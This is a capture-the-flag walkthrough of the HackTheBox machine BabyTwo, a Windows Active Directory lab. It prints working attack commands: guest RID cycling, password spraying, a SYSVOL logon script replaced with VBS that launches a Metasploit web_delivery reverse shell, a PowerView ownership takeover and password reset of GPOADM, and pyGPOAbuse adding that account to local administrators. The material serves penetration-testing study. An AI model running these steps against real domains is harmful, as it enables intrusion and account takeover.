# [HackTheBox - BabyTwo](https://app.hackthebox.com/machines/BabyTwo)

![8da3981f5bc5e3d53775b749202dda51.png](/resources/8da3981f5bc5e3d53775b749202dda51.png)

## Table of Contents

- [Abstract](#abstract)
- [Enumeration](#enumeration)
- [Initial Access via logon script replacement](#initial-access-via-logon-script-replacement)
- [Privilege Escalation via Changing User password and GPO Abuse](#privilege-escalation-via-changing-user-password-and-gpo-abuse)

***
## Abstract
BabyTwo is a vulnlab machine imported to HackTheBox as a medium Windows Active Directory box, I started with network enumeration with nmap, revealing this machine is a domain controller and no extra service running on this machine.

On the enumeration phase, I discovered guest account is enabled and can be used to pull user list and access apps share, change log and shoutcut file revealing that there is a logon user script deployed on this domain controller which I found that with combination of user:user, I can compromise another 2 users and edit logon script located on SYSVOL\script to get a foothold as  "Amelia.Griffiths" user.

After gaining foothoold, the bloodhound result telling us that  "Amelia.Griffiths" is a member of "legacy" group which can reset password of "GPOADM" user though WriteOwner and WriteDACL and "GPOADM" user have GenericAll over 2 default GPOs that affect domain controller so after I used PowerView to reset a password of  "GPOADM", I used pygpoabuse to add "GPOADM" to local administrators group and root the box.

## Enumeration

I start with nmap without any flag to quickly scan well-known port which we can see that this machine is a domain controller and there is no website to explore as well.

![7d3b76d85c10f405ee283dbcaceeaa3b.png](/resources/7d3b76d85c10f405ee283dbcaceeaa3b.png)

I rerun my scan again with `-sCV` for service enumeration and nmap script engine which reveals hostname that we can add to hosts file and then we can use these hostname instead of IP address unless needed.

![aa0eea0c1c878bddcf0fa87b793dddb5.png](/resources/aa0eea0c1c878bddcf0fa87b793dddb5.png)

Since there is no website to explore, I use NetExec to test null session on SMB and LDAP but we can see that null session could not be used to list users or shares here. 

![7cf5f6f09cd1e6a2598cf421375b065c.png](/resources/7cf5f6f09cd1e6a2598cf421375b065c.png)

However guest user is enabled on this domain and can be used to read "apps" share and can even write "homes" shares
```
nxc smb baby2.vl -u 'guest' -p '' --shares
```
![6fb7d1188bbc4360afe54074d199317b.png](/resources/6fb7d1188bbc4360afe54074d199317b.png)

In the apps share, we can see a shortcut file of `login.vbs` file incidating there might be a logon script on this machine
```
smbclient \\\\baby2.vl\\apps -N -L
```
![e65cc2082bf62590224838b7229d1ed8.png](/resources/e65cc2082bf62590224838b7229d1ed8.png)

After reading `CHANGELOG` file, we can now confirm that there is a logon script on this domain controller but we need to know its path so we can modify it if we get a valid domain user credential.

![dd1b20d40ae524a24231404e52616d43.png](/resources/dd1b20d40ae524a24231404e52616d43.png)

We can also read the content of the shortcut file which reveals that this script is located inside `scripts` folder inside SYSVOL which we will be able to read it once we get valid domain user credential.
![39a1c3fc126c1251a426da3bdfbc8249.png](/resources/39a1c3fc126c1251a426da3bdfbc8249.png)

On the homes share, We can see list of users on this machine but we can not look inside any of these folders since We are just merely a guest.
```
smbclient \\\\baby2.vl\\homes -N -L
```
![da7c594f6120425f3585c242cfc338e7.png](/resources/da7c594f6120425f3585c242cfc338e7.png)

But since guest can enumerate share then it can also be used to pull user list via RID cycling method as well.
```
nxc smb baby2.vl -u 'guest' -p '' --rid-brute
```
![67e425e4616704aec2b2ef16f9433cbc.png](/resources/67e425e4616704aec2b2ef16f9433cbc.png)

Now we add them to a text file so we can start password spraying if we find one.
```
nxc smb baby2.vl -u 'guest' -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users
```
![bdde57c629cb3abd871317fee78ad294.png](/resources/bdde57c629cb3abd871317fee78ad294.png)

But since there is no other place I could look for, I use NetExec to test if there is any user that used their username as a password which I found 2 users here and they are "Carl.Moore" and "library" users
```
nxc smb baby2.vl -u users -p users --no-bruteforce --continue-on-success
```
![c4a3b34162893dadec3220892bad3d7e.png](/resources/c4a3b34162893dadec3220892bad3d7e.png)

And now since I have 2 valid users, I will use it to look up to login script on the SYSVOL share. One more thing to notice here is after using NetExec to list shares that both users can access, I noticed "docs" share that have not been found before so I took a look and found nothing.
```
nxc smb baby2.vl -u library -p library --shares
nxc smb baby2.vl -u Carl.Moore -p Carl.Moore --shares
```
![8edbba99af81a9b145aca186be75d362.png](/resources/8edbba99af81a9b145aca186be75d362.png)

Before checking SYSVOL share,I will use bloodhound python to collect domain information and plot them in Bloodhound Community Edition.
```
bloodhound-python -u 'library' -p 'library' -d baby2.vl -c all -ns 10.129.200.216 --zip
```
![ac280d4423e7f4f65c249271a6e74c4a.png](/resources/ac280d4423e7f4f65c249271a6e74c4a.png)

On the bloodhound show that Amelia.Griffiths user have the logon script we just found from the share earlier so if we able to edit this script to add a reverse shell command to us, we will be given a shell as this user. 

![710c9cd5fec368e3b8c9622008fde8eb.png](/resources/710c9cd5fec368e3b8c9622008fde8eb.png)

First I grab get `login.vbs` script from SYSVOL using one of valid user credential.
```
smbclient \\\\baby2.vl\\SYSVOL -U Carl.Moore%Carl.Moore
```
![bf712b46b30250f7bf5988742d42c158.png](/resources/bf712b46b30250f7bf5988742d42c158.png)

This script will just map network share to a drive but first we need to confirm if we could really write anything to scripts folder so if not, the all modification would be in vain. 

![9ead6f1e0b7d3130b0e6ae3bfd7b5077.png](/resources/9ead6f1e0b7d3130b0e6ae3bfd7b5077.png)

I test by uploading a blank file and turn out we can actually write anything in SYSVOL despite NetExec telling us we only have READ permission

![527c3f1585da50a2861c9311b8dba2e0.png](/resources/527c3f1585da50a2861c9311b8dba2e0.png)

The reason why we can write to SYSVOL is because there are 2 level of permissions on the shares folder, one is Share permission and other is NTFS file-system permission and the NetExec and other various SMB tool can only check for Share permission but not file-system permission but this case is also not normal since in normal circumstance, only administrator-level user have write access to SYSVOL folder/share.

## Initial Access via logon script replacement
Now since I know that I can write file on the scripts folder then I can edit the script with the reverse shell payload generated with "web_delivery" module on metasploit
```
use exploit/multi/script/web_delivery
set lhost tun0
set lport 443
set uripath chicken
set target 2
run
```
![f3165242c0b2cd1358211d13baddf404.png](/resources/f3165242c0b2cd1358211d13baddf404.png)

Add the following code into the script and now we are ready for the attack.
```
Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -e ..." , 0, False
Set objShell = Nothing
```
![3016da60ff064183ee9e0cf0ebc9cf1b.png](/resources/3016da60ff064183ee9e0cf0ebc9cf1b.png)

I delete the original and upload the new one instead, now I will have to wait until "Amelia.Griffiths" logon event occurs to trigger the script.

![67a28516887dc05ab9a2dc11adf5220d.png](/resources/67a28516887dc05ab9a2dc11adf5220d.png)

And I did not have to wait long. Only a brief moment, Metasploit was deliverying a payload and now I have access to the machine as Amelia.Griffiths.

![60255f8ff2fbbd44259124f78774b223.png](/resources/60255f8ff2fbbd44259124f78774b223.png)

Go to C:\ to loot user flag and then we can go back to Bloodhound if we could do anything about this account.

![b590cf220c19a954e4654d24d26d6b1d.png](/resources/b590cf220c19a954e4654d24d26d6b1d.png)

## Privilege Escalation via Changing User password and GPO Abuse

After checking the outbound control edge to Amelia.Griffiths, I found that this user is a member of "Legacy" group which have "WriteOwner" and "WriteDACL" to GPOADM (GPO Admin) user and that mean we can make "Amelia.Griffiths" a new owner of GPOADM user and change its password but what's next after that? 

![0852cd73182c47a62e462c43394aa0de.png](/resources/0852cd73182c47a62e462c43394aa0de.png)

The GPOADM user have GenericAll to 2 default GPOs which we can abuse this by configure group policy with our desired setting but the most easiest choice is to run GPO Immediate Scheduled task with our command to make ourselves administrators although this is very bad obsec in any production environment but it is the most convenient one for this machine

![e56141b444baba0b1af6ba8f9595ca17.png](/resources/e56141b444baba0b1af6ba8f9595ca17.png)

I also confirm that I can abuse either of them to make  GPOADM a new local administrator after chaning its password and sure enough that both GPO are linked to the domain and will take effect on the machine. and I also grab the object ID of this GPO here which will be used to specify which GPO to abuse later after taking control of GPOADM (that's {318...} one in Distinguished Name field)

![21c02d0a78ecccc676b19d90c209befd.png](/resources/21c02d0a78ecccc676b19d90c209befd.png)

First, I need to "Amelia.Griffiths" a new owner of GPOADM user and change its password which I use PowerViews because I did not obtain a password of this user but using logon script to get a reverse shell so remote tool like impacket and bloodyAD is not suitable here

Since I used meterpreter, I can just upload PowerView from my file system without hosting file server or http server and after that I import the script, set object owner of GPOADM to Amelia.Griffiths user and add GenericAll permission from Amelia.Griffiths to GPOADM which allow me to reset password of this user.
```
upload PowerView.ps1
shell
powershell -ep bypass
Import-Module .\PowerView.ps1
Set-DomainObjectOwner -Identity 'GPOADM' -OwnerIdentity 'Amelia.Griffiths'
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "GPOADM" -PrincipalIdentity "Amelia.Griffiths"
$NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
Set-DomainUserPassword -Identity 'GPOADM' -AccountPassword $NewPassword
```
![9cec944fa143c8368b27a33c5f0b2be7.png](/resources/9cec944fa143c8368b27a33c5f0b2be7.png)

After changing password, I confirm it with NetExec and now we have full control over GPOADM user. 

![f0a77a0ac133eb5685d50b833f16f163.png](/resources/f0a77a0ac133eb5685d50b833f16f163.png)

After that I use [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse), this tool is a partial implementation of [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) which allow me to remotely run GPO immediate scheduled task without having a shell as GPOADM user which I use with net localgroup command to add GPOADM user to local administrators group.
```
python pygpoabuse.py baby2.vl/GPOADM:'Password1234' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -command 'net localgroup administrators GPOADM /add' -f
```
![bb2fd7d83c54d336b2c8729b16fb15eb.png](/resources/bb2fd7d83c54d336b2c8729b16fb15eb.png)

After a while, I check the local administrators group from my reverse shell session and we can see that GPOADM was successfully added to local administrators group as planned

![b45cb23e2aefd8976cd6c4f5eb641fa9.png](/resources/b45cb23e2aefd8976cd6c4f5eb641fa9.png)

We can now login as GPOADM and loot the root flag :D
```
evil-winrm -i baby2.vl -u GPOADM -p 'Password1234' 
```
![584b6addd03c8f0797c88ec051003313.png](/resources/584b6addd03c8f0797c88ec051003313.png)

![442d28c2be6d83237da75ef6c4e00e5f.png](/resources/442d28c2be6d83237da75ef6c4e00e5f.png)

https://labs.hackthebox.com/achievement/machine/1438364/746
***